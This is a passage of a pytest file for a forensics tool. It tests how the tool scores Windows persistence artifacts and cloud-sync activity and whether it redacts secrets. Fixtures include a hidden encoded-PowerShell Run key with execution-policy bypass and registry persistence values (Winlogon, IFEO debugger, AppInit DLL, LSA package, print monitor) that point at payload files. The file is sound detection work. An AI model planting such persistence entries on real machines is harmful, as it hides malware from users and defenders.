            "ValueData": "powershell.exe -NoP -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand AAAA",
            "User": "dfir",
            "SID": "S-1-5-21-111-222-333-1001",
            "LastWriteTime": "2026-05-15T10:00:00Z",
        },
        {"artifact_type": "autoruns", "parser": "registry_run_key", "source_path": "NTUSER.DAT", "name": "NTUSER.DAT"},
    )
    assert document["artifact"]["type"] == "autorun"
    assert document["event"]["type"] == "autorun"
    assert document["persistence"]["mechanism"] == "run_key"
    assert document["timestamp_precision"] == "registry_last_write"
    assert document["execution"]["is_execution_confirmed"] is False
    assert document["risk_score"] >= 90
    assert "Run key persistence" in document["suspicious_reasons"]
    assert "Autorun uses PowerShell" in document["suspicious_reasons"]
    assert "Autorun uses encoded PowerShell" in document["suspicious_reasons"]
    assert "Autorun uses execution policy bypass" in document["suspicious_reasons"]
    assert "Autorun command has hidden window" in document["suspicious_reasons"]


def test_registry_persistence_microsoft_signed_onedrive_stays_low_risk() -> None:
    document = normalize_row(
        "case-1",
        "ev-autorun",
        "art-autorun",
        {
            "ArtifactType": "registry_run_key",
            "Hive": "NTUSER",
            "KeyPath": "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "ValueName": "OneDrive",
            "ValueData": "\"C:\\Users\\dfir\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\" /background",
            "User": "dfir",
            "SID": "S-1-5-21-111-222-333-1001",
            "LastWriteTime": "2026-05-15T10:00:00Z",
            "Publisher": "Microsoft Corporation",
            "Company": "Microsoft Corporation",
            "Signer": "Microsoft Windows",
            "Signed": "true",
            "Verified": "true",
        },
        {"artifact_type": "autoruns", "parser": "registry_run_key", "source_path": "NTUSER.DAT", "name": "NTUSER.DAT"},
    )
    assert document["risk_score"] <= 20
    assert "Run key persistence" not in (document.get("suspicious_reasons") or [])
    assert "Autorun uses PowerShell" not in (document.get("suspicious_reasons") or [])


def test_registry_persistence_mechanisms_winlogon_ifeo_appinit_lsa_print_monitor() -> None:
    cases = [
        (
            {"KeyPath": "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "ValueName": "Shell", "ValueData": "explorer.exe, C:\\Users\\dfir\\AppData\\Roaming\\payload.exe"},
            "winlogon_shell",
            "Winlogon autorun modified",
            80,
        ),
        (
            {"KeyPath": "Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe", "ValueName": "Debugger", "ValueData": "C:\\Users\\dfir\\AppData\\Local\\Temp\\debugger.exe"},
            "ifeo_debugger",
            "IFEO debugger persistence",
            85,
        ),
        (
            {"KeyPath": "Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows", "ValueName": "AppInit_DLLs", "ValueData": "C:\\Users\\dfir\\AppData\\Roaming\\evil.dll"},
            "appinit_dll",
            "AppInit DLL persistence",
            80,
        ),
        (
            {"KeyPath": "SYSTEM\\CurrentControlSet\\Control\\Lsa", "ValueName": "Authentication Packages", "ValueData": "msv1_0 evilpkg"},
            "lsa_package",
            "LSA package persistence",
            85,
        ),
        (
            {"KeyPath": "SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\EvilMonitor", "ValueName": "Driver", "ValueData": "C:\\Users\\dfir\\AppData\\Roaming\\evilmon.dll"},
            "print_monitor",
            "Print Monitor persistence",
            70,
        ),
    ]
    for row, mechanism, reason, min_risk in cases:
        document = normalize_row(
            "case-1",
            "ev-autorun",
            "art-autorun",
            {"ArtifactType": "registry_autorun", "Hive": "SOFTWARE", "LastWriteTime": "2026-05-15T10:00:00Z", **row},
            {"artifact_type": "autoruns", "parser": "autoruns_jsonl", "source_path": "autoruns.jsonl", "name": "autoruns.jsonl"},
        )
        assert document["persistence"]["mechanism"] == mechanism
        assert reason in document["suspicious_reasons"]
        assert document["risk_score"] >= min_risk


def test_startup_folder_persistence_script_high_risk() -> None:
    document = normalize_row(
        "case-1",
        "ev-autorun",
        "art-autorun",
        {
            "ArtifactType": "startup_folder",
            "EntryLocation": "C:\\Users\\dfir\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
            "Entry": "runme.ps1",
            "ImagePath": "C:\\Users\\dfir\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\runme.ps1",
            "LaunchString": "C:\\Users\\dfir\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\runme.ps1",
            "Timestamp": "2026-05-15T10:00:00Z",
        },
        {"artifact_type": "autoruns", "parser": "startup_folder", "source_path": "Startup\\runme.ps1", "name": "runme.ps1"},
    )
    assert document["persistence"]["mechanism"] == "startup_folder"
    assert "Autorun launches script" in document["suspicious_reasons"]
    assert document["risk_score"] >= 70


def test_artifact_classification_cloud_csv() -> None:
    result = classify_artifact(
        Path("OneDrive_Audit.csv"),
        ["Provider", "AccountEmail", "SyncRoot", "LocalPath", "Status", "LastSync"],
    )
    assert result["artifact_type"] == "cloud"
    assert result["parser"] == "cloud_onedrive_csv"


def test_artifact_classification_cloud_json() -> None:
    result = classify_artifact(
        Path("CloudSync.json"),
        ["Provider", "Account", "SyncRoot", "LocalPath", "LastUpload"],
    )
    assert result["artifact_type"] == "cloud"
    assert result["parser"] == "cloud_onedrive_json"


def test_velociraptor_discovery_detects_cloud_sync_roots_and_logs() -> None:
    root = Path(__file__).parent / "fixtures" / "cloud_sync" / "velociraptor_collection_cloud"
    discovery = discover_velociraptor_evidences(root)
    cloud_candidates = [item for item in discovery.candidates if item.category == "cloud_sync"]
    assert cloud_candidates
    onedrive_root = next(item for item in cloud_candidates if item.provider == "onedrive" and item.parser_status == "discovery_only")
    gdrive_log = next(item for item in cloud_candidates if item.provider == "google_drive" and item.parser_status == "ready")
    assert onedrive_root.artifact_type == "onedrive_folder"
    assert "not extracted in bulk by default" in str(onedrive_root.reason)
    assert gdrive_log.parser == "provider_log"
    assert discovery.summary["cloud_candidates"] >= 2
    assert "onedrive" in discovery.summary["providers_detected"]


def test_detect_cloud_provider_from_path_variants() -> None:
    assert detect_cloud_provider_from_path(r"C:\Users\alex\OneDrive\file.docx")[0] == "onedrive"
    assert detect_cloud_provider_from_path(r"C:\Users\alex\OneDrive - Org\file.xlsx")[0] == "onedrive"
    assert detect_cloud_provider_from_path(r"C:\Users\alex\Dropbox\file.pdf")[0] == "dropbox"
    assert detect_cloud_provider_from_path(r"G:\My Drive\file.txt")[0] == "google_drive"
    assert detect_cloud_provider_from_path(r"C:\Users\alex\iCloudDrive\file.pdf")[0] == "icloud"
    assert detect_cloud_provider_from_path(r"C:\Users\alex\Box\file.pdf")[0] == "box"


def test_detect_cloud_provider_from_internal_onedrive_path_does_not_promote_sync_root() -> None:
    provider, sync_root, _ = detect_cloud_provider_from_path(
        r"C:\Users\dfir\AppData\Local\Microsoft\OneDrive\settings\ECSConfig.json"
    )
    assert provider == "onedrive"
    assert sync_root is None


def test_cloud_csv_normalization_maps_provider_account_and_paths() -> None:
    path = Path(__file__).parent / "fixtures" / "cloud_sync" / "cloud_generic_sample.csv"
    docs = normalize_file(
        "case-1",
        "ev-1",
        "art-1",
        path,
        {
            "artifact_type": "cloud",
            "parser": "cloud_onedrive_csv",
            "source_tool": "onedrive",
            "source_format": "csv",
            "source_path": str(path),
            "name": path.name,
        },
    )
    assert docs
    first = docs[0]
    assert first["artifact"]["type"] == "cloud"
    assert first["cloud"]["provider"] == "OneDrive"
    assert first["cloud"]["account_email"] == "alex@example.com"
    assert first["cloud"]["sync_root"] == r"C:\Users\alex\OneDrive"
    assert first["cloud"]["local_path"] == r"C:\Users\alex\OneDrive\Documents\report.docx"
    assert first["cloud"]["last_upload_time"] == "2026-05-11T09:11:00Z"
    assert first["timestamp_precision"] == "cloud_last_upload_time"
    assert "raw" in first


def test_cloud_path_inference_normalization_does_not_read_directory_contents(tmp_path: Path) -> None:
    cloud_dir = tmp_path / "cloud-root-placeholder"
    cloud_dir.mkdir()
    docs = normalize_file(
        "case-1",
        "ev-1",
        "art-1",
        cloud_dir,
        {
            "artifact_type": "cloud",
            "parser": "path_inference",
            "source_tool": "onedrive",
            "source_format": "path_inference",
            "source_path": str(cloud_dir),
            "name": "Onedrive sync root placeholder",
            "cloud_provider": "onedrive",
            "cloud_sync_root": r"C:\Users\dfir\OneDrive",
            "cloud_artifact_type": "onedrive_folder",
        },
    )
    assert len(docs) == 1
    first = docs[0]
    assert first["event"]["type"] == "cloud_item_observed"
    assert first["event"]["action"] == "cloud_item_observed"
    assert first["cloud"]["sync_root"] == r"C:\Users\dfir\OneDrive"
    assert first["cloud"]["parser_status"] == "discovery_only"
    assert first["cloud"]["detection_method"] == "path_inference"


def test_velociraptor_discovery_does_not_misclassify_onedrive_internal_files_as_sync_roots(tmp_path: Path) -> None:
    root = tmp_path / "velociraptor_collection_cloud_internal"
    report = root / "uploads" / "auto" / "C%3A" / "Users" / "dfir" / "OneDrive" / "Documents" / "report.docx"
    config = root / "uploads" / "auto" / "C%3A" / "Users" / "dfir" / "AppData" / "Local" / "Microsoft" / "OneDrive" / "settings" / "ECSConfig.json"
    report.parent.mkdir(parents=True, exist_ok=True)
    config.parent.mkdir(parents=True, exist_ok=True)
    report.write_text("report", encoding="utf-8")
    config.write_text('{"Account":"dfir@example.com"}', encoding="utf-8")

    discovery = discover_velociraptor_evidences(root)
    cloud_candidates = [item for item in discovery.candidates if item.category == "cloud_sync"]

    onedrive_root = next(item for item in cloud_candidates if item.parser == "path_inference" and item.provider == "onedrive")
    onedrive_config = next(item for item in cloud_candidates if item.artifact_type == "cloud_client_config")

    assert onedrive_root.parser_status == "discovery_only"
    assert onedrive_root.original_path.endswith("report.docx")
    assert onedrive_root.normalized_windows_path == r"C:\Users\dfir\OneDrive"
    assert onedrive_config.parser_status == "ready"
    assert onedrive_config.original_path.endswith("ECSConfig.json")
    assert all(
        not (
            item.parser == "path_inference"
            and item.normalized_windows_path == r"C:\Users\dfir\AppData\Local\Microsoft\OneDrive\settings\ECSConfig.json"
        )
        for item in cloud_candidates
    )


def test_cloud_json_normalization_handles_archive_candidate() -> None:
    path = Path(__file__).parent / "fixtures" / "cloud_sync" / "cloud_generic_sample.json"
    docs = normalize_file(
        "case-1",
        "ev-1",
        "art-1",
        path,
        {
            "artifact_type": "cloud",
            "parser": "cloud_onedrive_json",
            "source_tool": "google_drive",
            "source_format": "json",
            "source_path": str(path),
            "name": path.name,
        },
    )
    assert docs
    doc = docs[0]
    assert doc["event"]["type"] == "cloud_upload"
    assert "archive_file" in doc["tags"]
    assert doc["cloud"]["provider"] == "GoogleDrive"


def test_cloud_onedrive_settings_json_normalizes_as_client_config() -> None:
    path = Path(__file__).parent / "fixtures" / "cloud_sync" / "velociraptor_collection_cloud" / "uploads" / "auto" / "C%3A" / "Users" / "alex" / "AppData" / "Local" / "Microsoft" / "OneDrive" / "settings" / "ECSConfig.json"
    docs = normalize_file(
        "case-1",
        "ev-1",
        "art-1",
        path,
        {
            "artifact_type": "cloud",
            "parser": "cloud_onedrive_json",
            "source_tool": "onedrive",
            "source_format": "json",
            "source_path": "C%3A/Users/dfir/AppData/Local/Microsoft/OneDrive/settings/ECSConfig.json",
            "name": "ECSConfig.json",
            "cloud_provider": "onedrive",
            "user": "dfir",
            "velociraptor_original_path": "C%3A/Users/dfir/AppData/Local/Microsoft/OneDrive/settings/ECSConfig.json",
            "velociraptor_normalized_windows_path": r"C:\Users\dfir\AppData\Local\Microsoft\OneDrive\settings\ECSConfig.json",
            "velociraptor_category": "cloud_sync",
            "velociraptor_parser_status": "ready",
            "cloud_artifact_type": "cloud_client_config",
        },
    )
    assert len(docs) == 1
    doc = docs[0]
    assert doc["artifact"]["type"] == "cloud"
    assert doc["artifact"]["parser"] == "cloud_onedrive_json"
    assert doc["cloud"]["provider"] == "OneDrive"
    assert doc["cloud"]["artifact_type"] == "onedrive_item"
    assert doc["event"]["category"] == "cloud"
    assert doc["event"]["type"] == "cloud_item_observed"
    assert doc["event"]["action"] == "cloud_item_observed"
    assert "ECSConfig.json" in doc["event"]["message"]
    assert doc["event"]["severity"] == "info"
    assert doc["risk_score"] <= 5
    assert doc["event"]["timeline_include"] is False
    assert "missing_timestamp" in doc["data_quality"]
    assert "low_confidence_timestamp" not in doc["data_quality"]
    assert doc["timestamp_precision"] == "unknown"
    assert doc["timezone"] is None
    assert doc["user"]["name"] == "dfir"
    assert doc["cloud"]["user"] == "dfir"
    assert doc["cloud"]["local_path"] == r"C:\Users\dfir\AppData\Local\Microsoft\OneDrive\settings\ECSConfig.json"
    assert "onedrive" in doc["tags"]
    assert "onedrive" in doc["tags"]
    assert "ECSConfig.json" in doc["search_text"]
    assert r"C:\Users\dfir\AppData\Local\Microsoft\OneDrive\settings\ECSConfig.json" in doc["search_text"]
    assert "ConfigID" not in doc["search_text"]
    assert len(doc["search_text"]) < 2000


def test_cloud_onedrive_log_ini_normalizes_as_client_log(tmp_path: Path) -> None:
    path = tmp_path / "DeviceHealthSummaryConfiguration.ini"
    path.write_text("Channel=Insiders\nState=Enabled\n", encoding="utf-8")
    docs = normalize_file(
        "case-1",
        "ev-1",
        "art-1",
        path,
        {
            "artifact_type": "cloud",
            "parser": "cloud_raw",
            "source_tool": "onedrive",
            "source_format": "log",
            "source_path": "C%3A/Users/dfir/AppData/Local/Microsoft/OneDrive/setup/logs/DeviceHealthSummaryConfiguration.ini",
            "name": "DeviceHealthSummaryConfiguration.ini",
            "cloud_provider": "onedrive",
            "user": "dfir",
            "velociraptor_original_path": "C%3A/Users/dfir/AppData/Local/Microsoft/OneDrive/setup/logs/DeviceHealthSummaryConfiguration.ini",
            "velociraptor_normalized_windows_path": r"C:\Users\dfir\AppData\Local\Microsoft\OneDrive\setup\logs\DeviceHealthSummaryConfiguration.ini",
            "velociraptor_category": "cloud_sync",
            "velociraptor_parser_status": "ready",
            "cloud_artifact_type": "cloud_client_log",
        },
    )
    assert len(docs) == 1
    doc = docs[0]
    assert doc["event"]["type"] == "cloud_item_observed"
    assert doc["event"]["action"] == "cloud_item_observed"
    assert doc["event"]["timeline_include"] is False
    assert doc["user"]["name"] == "dfir"


def test_cloud_sync_root_path_inference_stays_sync_root() -> None:
    docs = normalize_file(
        "case-1",
        "ev-1",
        "art-1",
        Path("."),
        {
            "artifact_type": "cloud",
            "parser": "path_inference",
            "source_tool": "onedrive",
            "source_format": "path_inference",
            "source_path": "C%3A/Users/dfir/OneDrive/Documents/report.docx",
            "name": "Onedrive sync root placeholder",
            "cloud_provider": "onedrive",
            "user": "dfir",
            "cloud_sync_root": r"C:\Users\dfir\OneDrive",
            "cloud_artifact_type": "onedrive_folder",
        },
    )
    doc = docs[0]
    assert doc["event"]["type"] == "cloud_item_observed"
    assert doc["event"]["action"] == "cloud_item_observed"
    assert doc["cloud"]["sync_root"] == r"C:\Users\dfir\OneDrive"


def test_cloud_file_activity_for_real_cloud_file_path() -> None:
    doc = normalize_row(
        "case-1",
        "ev-1",
        "art-1",
        {
            "Provider": "onedrive",
            "SyncRoot": r"C:\Users\dfir\OneDrive",
            "LocalPath": r"C:\Users\dfir\OneDrive\Documents\report.docx",
            "Modified": "2026-05-12T10:00:00Z",
        },
        {
            "artifact_type": "cloud",
            "parser": "cloud_onedrive_csv",
            "source_tool": "onedrive",
            "source_format": "csv",
            "source_path": "report.csv",
            "name": "report.csv",
        },
    )
    assert doc["event"]["type"] == "cloud_item_observed"
    assert doc["event"]["action"] == "cloud_item_observed"
    assert doc["cloud"]["local_path"] == r"C:\Users\dfir\OneDrive\Documents\report.docx"
    assert doc["user"]["name"] == "dfir"


def test_cloud_detection_marks_sensitive_file_and_executable() -> None:
    path = Path(__file__).parent / "fixtures" / "cloud_sync" / "cloud_generic_sample.csv"
    docs = normalize_file(
        "case-1",
        "ev-1",
        "art-1",
        path,
        {
            "artifact_type": "cloud",
            "parser": "cloud_onedrive_csv",
            "source_tool": "generic_cloud",
            "source_format": "csv",
            "source_path": str(path),
            "name": path.name,
        },
    )
    sensitive = next(doc for doc in docs if doc["file"]["name"] == "credentials.kdbx")
    assert "sensitive_file" in sensitive["tags"]
    assert "credential_file" in sensitive["tags"]
    assert any("Sensitive file observed inside cloud sync folder" in reason for reason in sensitive["suspicious_reasons"])


def test_cloud_sprint_upload_delete_shared_and_redaction() -> None:
    syncroot = normalize_row(
        "case-1",
        "ev-cloud-1",
        "art-cloud-1",
        {
            "ArtifactType": "cloud_syncroot",
            "Provider": "OneDrive",
            "AccountEmail": "dfir@example.com",
            "User": "dfir",
            "SyncRoot": r"C:\Users\dfir\OneDrive",
            "LastSyncTime": "2026-05-15T10:00:00Z",
        },
        {"artifact_type": "cloud", "parser": "cloud_syncroot", "source_path": "cloud_syncroot.jsonl", "name": "cloud_syncroot.jsonl"},
    )
    upload = normalize_row(
        "case-1",
        "ev-cloud-2",
        "art-cloud-2",
        {
            "Provider": "OneDrive",
            "LocalPath": r"C:\Users\dfir\Desktop\payload.exe",
            "RemotePath": "/Documents/payload.exe",
            "Direction": "upload",
            "LastUploadTime": "2026-05-15T11:00:00Z",
        },
        {"artifact_type": "cloud", "parser": "cloud_onedrive_jsonl", "source_path": "cloud_upload_payload.jsonl", "name": "cloud_upload_payload.jsonl"},
    )
    shared = normalize_row(
        "case-1",
        "ev-cloud-3",
        "art-cloud-3",
        {
            "Provider": "OneDrive",
            "LocalPath": r"C:\Users\dfir\OneDrive\passwords.xlsx",
            "RemotePath": "/Shared/passwords.xlsx",
            "Shared": "true",
            "ModifiedTime": "2026-05-15T11:30:00Z",
        },
        {"artifact_type": "cloud", "parser": "cloud_onedrive_jsonl", "source_path": "cloud_shared_sensitive.jsonl", "name": "cloud_shared_sensitive.jsonl"},
    )
    deleted = normalize_row(
        "case-1",
        "ev-cloud-4",
        "art-cloud-4",
        {
            "Provider": "OneDrive",
            "LocalPath": r"C:\Users\dfir\OneDrive\backup.7z",
            "DeletedTime": "2026-05-15T12:00:00Z",
            "Direction": "delete",
        },
        {"artifact_type": "cloud", "parser": "cloud_onedrive_jsonl", "source_path": "cloud_deleted_archive.jsonl", "name": "cloud_deleted_archive.jsonl"},
    )
    secret = normalize_row(
        "case-1",
        "ev-cloud-5",
        "art-cloud-5",
        {
            "Provider": "OneDrive",
            "LocalPath": r"C:\Users\dfir\OneDrive\notes.txt",
            "refresh_token": "SuperSecretRefreshTokenValue",
            "access_token": "SuperSecretAccessTokenValue",
            "ModifiedTime": "2026-05-15T12:05:00Z",
        },
        {"artifact_type": "cloud", "parser": "cloud_onedrive_jsonl", "source_path": "cloud_secret_redaction.jsonl", "name": "cloud_secret_redaction.jsonl"},
    )
    report = _build_cloud_parse_report(
        [{"artifact_type": "cloud", "parser": "cloud_onedrive_jsonl", "records_read": 5, "records_parsed": 5, "records_indexed": 5, "source_file": "cloud_bundle.jsonl"}],
        [],
        [syncroot, upload, shared, deleted, secret],
        selected_artifact_types=["cloud"],
        scope="evidence",
    )
    sample = _build_cloud_sample_events([syncroot, upload, shared, deleted, secret])
    assert syncroot["artifact"]["type"] == "cloud"
    assert syncroot["event"]["type"] == "cloud_item_observed"
    assert syncroot["timestamp_precision"] == "cloud_last_sync_time"
    assert upload["event"]["type"] == "cloud_upload"
    assert upload["file"]["extension"] == ".exe"
    assert "Cloud upload of executable" in (upload.get("suspicious_reasons") or [])
    assert "Cloud upload from user-writable path" in (upload.get("suspicious_reasons") or [])
    assert upload["risk_score"] >= 70
    assert shared["risk_score"] >= 60
    assert "Cloud shared sensitive item" in (shared.get("suspicious_reasons") or [])
    assert deleted["event"]["type"] == "cloud_deleted"
    assert "Cloud deleted suspicious item" in (deleted.get("suspicious_reasons") or [])
    assert "SuperSecretRefreshTokenValue" not in (secret.get("search_text") or "")
    assert "SuperSecretAccessTokenValue" not in (secret.get("raw_summary") or "")
    assert "cloud_secret_redacted" in (secret.get("data_quality") or [])
    assert report["records_indexed"] == 5
    assert report["upload_count"] >= 1
    assert report["deleted_count"] >= 1
    assert report["shared_count"] >= 1
    assert len(sample) >= 4


def test_cloud_syncroot_benign_stays_low_and_does_not_keep_syncroot_reason() -> None:
    syncroot = normalize_row(
        "case-1",
        "ev-cloud-sync",
        "art-cloud-sync",
        {
            "ArtifactType": "cloud_syncroot",
            "Provider": "OneDrive",
            "AccountEmail": "dfir@example.com",
            "User": "dfir",
            "SyncRoot": r"C:\Users\dfir\OneDrive",
            "LastSyncTime": "2026-05-15T10:00:00Z",
        },
        {"artifact_type": "cloud", "parser": "cloud_syncroot", "source_path": "cloud_syncroot.jsonl", "name": "cloud_syncroot.jsonl"},
    )
    assert syncroot["risk_score"] <= 10
    assert "normal_onedrive_sync" in (syncroot.get("tags") or [])
    assert "Cloud sync root observed" not in (syncroot.get("suspicious_reasons") or [])


def test_cloud_activity_detects_download_and_copy_to_cloud() -> None:
    browser_event = {
        "id": "browser-cloud-1",
        "@timestamp": "2026-05-11T10:00:00+00:00",
        "event": {"type": "file_downloaded", "severity": "info", "message": "Download to cloud path"},
        "artifact": {"type": "browser"},
        "user": {"name": "alex"},
        "file": {"path": r"C:\Users\alex\Dropbox\payload.exe", "name": "payload.exe", "extension": ".exe"},
        "download": {"target_path": r"C:\Users\alex\Dropbox\payload.exe", "file_name": "payload.exe"},
        "tags": ["download"],
        "suspicious_reasons": [],
    }
    powershell_event = {
        "id": "ps-cloud-1",
        "@timestamp": "2026-05-11T10:01:00+00:00",
        "event": {"type": "powershell_console_history", "severity": "info", "message": "Copy-Item to OneDrive"},
        "artifact": {"type": "powershell"},
        "user": {"name": "alex"},
        "process": {"name": "powershell.exe", "command_line": r'Copy-Item C:\Temp\report.docx C:\Users\alex\OneDrive\Documents\report.docx'},
        "powershell": {"command": r'Copy-Item C:\Temp\report.docx C:\Users\alex\OneDrive\Documents\report.docx'},
        "tags": ["powershell"],
        "suspicious_reasons": [],
    }
    defender_event = {
        "id": "def-cloud-1",
        "@timestamp": "2026-05-11T10:02:00+00:00",
        "event": {"type": "defender_detection", "severity": "high", "message": "Threat detected in Dropbox"},
        "artifact": {"type": "defender"},
        "file": {"path": r"C:\Users\alex\Dropbox\payload.exe", "name": "payload.exe", "extension": ".exe"},
        "detection": {"path": r"C:\Users\alex\Dropbox\payload.exe", "threat_name": "Trojan.CloudTest"},
        "tags": ["defender"],
        "suspicious_reasons": [],
    }
    activity_types = {item.activity_type for event in (browser_event, powershell_event, defender_event) for item in event_to_activity(event)}
    assert "downloaded_to_cloud" in activity_types
    assert "copied_to_cloud" in activity_types
    assert "defender_detection_in_cloud" in activity_types


def test_cloud_correlation_creates_staging_and_exfiltration_candidates(monkeypatch) -> None:
    docs = normalize_file(
        "case-1",
        "ev-1",
        "art-1",
        Path(__file__).parent / "fixtures" / "cloud_sync" / "cloud_generic_sample.csv",
        {
            "artifact_type": "cloud",
            "parser": "cloud_onedrive_csv",
            "source_tool": "generic_cloud",
            "source_format": "csv",
            "source_path": "cloud_generic_sample.csv",
            "name": "cloud_generic_sample.csv",
        },
    )
    powershell_event = {
        "id": "ps-cloud-2",
        "@timestamp": "2026-05-11T10:30:00+00:00",
        "event": {"type": "powershell_console_history", "severity": "info", "message": "Copy-Item to OneDrive"},
        "artifact": {"type": "powershell"},
        "user": {"name": "alex"},
        "process": {"name": "powershell.exe", "command_line": r'Copy-Item C:\Temp\report.docx C:\Users\alex\OneDrive\Documents\report.docx'},
        "powershell": {"command": r'Copy-Item C:\Temp\report.docx C:\Users\alex\OneDrive\Documents\report.docx'},
        "tags": ["powershell"],
        "suspicious_reasons": [],
    }
    monkeypatch.setattr("app.analysis.semi_auto.iter_case_events", lambda case_id, query=None: iter([*docs, powershell_event]))
    result = build_case_semi_auto_analysis("case-1")
    assert result["sections"]["cloud_sync_roots"]
    assert result["sections"]["possible_cloud_staging"]
    assert result["sections"]["possible_cloud_exfiltration"]
    assert any("candidate" in str(item["summary"]).lower() for item in result["sections"]["possible_cloud_exfiltration"])


def test_cloud_frontend_routes_to_cloud_view() -> None:
    frontend_root = Path(__file__).resolve().parents[2] / "frontend"
    if not frontend_root.exists():
        import pytest
        pytest.skip("frontend sources not present in backend test container")
    artifact_explorer = (frontend_root / "src" / "pages" / "ArtifactExplorer.tsx").read_text(encoding="utf-8")
    event_table = (frontend_root / "src" / "components" / "EventTable.tsx").read_text(encoding="utf-8")
    search_page = (frontend_root / "src" / "pages" / "Search.tsx").read_text(encoding="utf-8")
    semi_auto = (frontend_root / "src" / "pages" / "SemiAutoAnalysis.tsx").read_text(encoding="utf-8")
    assert 'artifactType === "cloud_sync"' in artifact_explorer
    assert 'if (artifactType === "cloud_sync") return "cloud_sync";' in event_table
    assert '"cloud_sync"' in search_page
    assert "cloud_sync_roots" in semi_auto
    assert "possible_cloud_staging" in semi_auto
    assert "possible_cloud_exfiltration" in semi_auto


def test_artifact_classification_network_wlan_hosts_dns() -> None:
    wlan = classify_artifact(Path("CorpWifi.xml"), [])
    hosts = classify_artifact(Path("hosts"), [])
    dns = classify_artifact(Path("DNSCache.csv"), ["Name", "RecordType", "IPAddress", "TTL", "Server"])
    ipconfig = classify_artifact(Path("ipconfig_all.txt"), [])
    assert wlan["artifact_type"] == "wlan"
    assert wlan["parser"] == "wlan_profile_xml"
    assert hosts["parser"] == "hosts_file"
    assert dns["parser"] == "dns_csv"
    assert ipconfig["parser"] == "ipconfig_txt"


def test_velociraptor_discovery_detects_network_candidates() -> None:
    root = Path(__file__).parent / "fixtures" / "network" / "velociraptor_collection_network"
    discovery = discover_velociraptor_evidences(root)
    network_candidates = [item for item in discovery.candidates if item.category == "network"]
    assert network_candidates
    wlan = next(item for item in network_candidates if item.artifact_type == "wlan_profile_xml")
    hosts = next(item for item in network_candidates if item.artifact_type == "hosts_file")
    evtx = next(item for item in network_candidates if item.artifact_type == "wlan_autoconfig_evtx")
    assert wlan.parser_status == "ready"
    assert hosts.parser_status == "ready"
    assert evtx.parser_status == "handled_by_evtx_parser"
    assert discovery.summary["network_candidates"] >= 3


def test_normalize_wlan_profiles_hosts_dns_and_txt_extract_expected_fields() -> None:
    base = Path(__file__).parent / "fixtures" / "network"
    wlan_docs = normalize_file(
        "case-1",
        "ev-net-wlan",
        "art-net-wlan",
        base / "wlan_profile_wpa2.xml",
        {
            "artifact_type": "wlan",
            "parser": "wlan_profile_xml",
            "source_tool": "wlan",
            "source_format": "xml",
            "source_path": str(base / "wlan_profile_wpa2.xml"),
            "name": "wlan_profile_wpa2.xml",
            "mtime": "2026-05-11T08:00:00Z",
        },
    )
    open_docs = normalize_file(
        "case-1",
        "ev-net-wlan-open",
        "art-net-wlan-open",
        base / "wlan_profile_open.xml",
        {
            "artifact_type": "wlan",
            "parser": "wlan_profile_xml",
            "source_tool": "wlan",
            "source_format": "xml",
            "source_path": str(base / "wlan_profile_open.xml"),
            "name": "wlan_profile_open.xml",
        },
    )
    hosts_docs = normalize_file(
        "case-1",
        "ev-net-hosts",
        "art-net-hosts",
        base / "hosts_sample",
        {
            "artifact_type": "network",
            "parser": "hosts_file",
            "source_tool": "hosts",
            "source_format": "txt",
            "source_path": str(base / "hosts_sample"),
            "name": "hosts",
        },
    )
    dns_docs = normalize_file(
        "case-1",
        "ev-net-dns",
        "art-net-dns",
        base / "dns_cache_sample.csv",
        {
            "artifact_type": "network",
            "parser": "dns_csv",
            "source_tool": "dns",
            "source_format": "csv",
            "source_path": str(base / "dns_cache_sample.csv"),
            "name": "dns_cache_sample.csv",
        },
    )
    ipconfig_docs = normalize_file(
        "case-1",
        "ev-net-ipconfig",
        "art-net-ipconfig",
        base / "ipconfig_all_sample.txt",
        {
            "artifact_type": "network",
            "parser": "ipconfig_txt",
            "source_tool": "ipconfig",
            "source_format": "txt",
            "source_path": str(base / "ipconfig_all_sample.txt"),
            "name": "ipconfig_all_sample.txt",
        },
    )
    netstat_docs = normalize_file(
        "case-1",
        "ev-net-netstat",
        "art-net-netstat",
        base / "netstat_sample.txt",
        {
            "artifact_type": "network",
            "parser": "network_txt",
            "source_tool": "netstat",
            "source_format": "txt",
            "source_path": str(base / "netstat_sample.txt"),
            "name": "netstat_sample.txt",
        },
    )
    arp_docs = normalize_file(
        "case-1",
        "ev-net-arp",
        "art-net-arp",
        base / "arp_sample.txt",
        {
            "artifact_type": "network",
            "parser": "network_txt",
            "source_tool": "arp",
            "source_format": "txt",
            "source_path": str(base / "arp_sample.txt"),
            "name": "arp_sample.txt",
        },
    )
    netsh_docs = normalize_file(
        "case-1",
        "ev-net-netsh",
        "art-net-netsh",
        base / "netsh_wlan_profiles_sample.txt",
        {
            "artifact_type": "network",
            "parser": "netsh_txt",
            "source_tool": "netsh",
            "source_format": "txt",
            "source_path": str(base / "netsh_wlan_profiles_sample.txt"),
            "name": "netsh_wlan_profiles_sample.txt",
        },
    )

    assert wlan_docs[0]["artifact"]["type"] == "wlan"
    assert wlan_docs[0]["event"]["type"] == "wlan_profile"
    assert wlan_docs[0]["wlan"]["ssid"] == "CorpWifi"
    assert wlan_docs[0]["wlan"]["authentication"] == "WPA2PSK"
    assert wlan_docs[0]["wlan"]["key_material_present"] is True
    assert "SuperSecretPassword" not in wlan_docs[0]["search_text"]
    assert "wlan_key_material_redacted" in (wlan_docs[0].get("data_quality") or [])
    assert open_docs[0]["event"]["timeline_include"] is False
    assert "open_wifi" in open_docs[0]["tags"]
    suspicious_host = next(item for item in hosts_docs if item["dns"]["name"] == "security.microsoft.com")
    assert suspicious_host["event"]["type"] == "hosts_entry"
    assert "suspicious_hosts_entry" in suspicious_host["tags"]
    assert any(item["dns"]["name"] == "drive.google.com" for item in dns_docs)
    assert ipconfig_docs[0]["network"]["gateway"] == "192.168.1.1"
    assert "8.8.8.8" in (ipconfig_docs[0]["network"]["dns_servers"] or [])
    assert netstat_docs[0]["event"]["type"] == "netstat_connection"
